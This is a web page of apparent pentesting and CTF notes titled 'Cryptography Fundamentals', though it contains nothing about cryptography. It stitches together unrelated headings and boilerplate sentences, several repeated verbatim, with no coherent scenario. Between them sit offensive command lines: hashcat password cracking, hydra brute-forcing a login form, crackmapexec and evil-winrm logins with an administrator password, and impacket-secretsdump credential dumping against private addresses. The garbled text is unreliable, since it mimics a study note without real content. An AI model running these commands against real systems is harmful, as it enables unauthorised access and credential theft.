---
TitleSEO: "Cryptography Fundamentals | ZureFX"
TitlePost: "Cryptography Fundamentals"
Author: "ZureFX"
Description: "Personal notes on Cryptography Fundamentals. Quick reference for pentesting and CTF challenges."
Keywords: "linux, networking, malware, windows, oscp, lateral movement"
URL: "https://zurefx.github.io/notes/note-cryptography-fundamentals-322.html"
URL_IMAGES: ""
Date: "2025-08-18"
Tags: "Linux, Networking, Malware, Windows, OSCP, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-cryptography-fundamentals-322"
Permalink: "/notes/note-cryptography-fundamentals-322.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Sudo Misconfiguration

### ACL Abuse

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

## GPP Password

### gobuster

- `wpscan`
- `sqlmap`
- `Remote Code Execution`
- `Kerberoasting`
- `XSS`

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.52.41.98 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.88.196.223 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.127.137.16
```

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

## NFS No Root Squash

### ldapsearch

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.160.107 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5986,3268,1521 10.94.89.216 -oN scan.txt
evil-winrm -i 10.84.182.193 -u administrator -p 'P@ssw0rd!'
```

> **Note:** Kerberoasting was identified as the primary attack vector in this scenario.

```bash
evil-winrm -i 10.100.149.99 -u administrator -p 'P@ssw0rd!'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

## Ruby on Rails

### Silver Ticket

> **Note:** XXE was identified as the primary attack vector in this scenario.

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.12.173 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

## feroxbuster

### RDP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.90.253.142 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p8888,110,8443 10.61.148.75 -oN scan.txt
```

```bash
gobuster dir -u http://10.81.219.238/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p464,5432,3268 10.75.91.210 -oN scan.txt
nmap -sCV -p636,587,22 10.58.84.136 -oN scan.txt
crackmapexec smb 10.98.67.225 -u administrator -p 'P@ssw0rd!' --shares
```

```powershell
gobuster dir -u http://10.34.105.208/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.14.95.55 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.106.37.6
```

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.
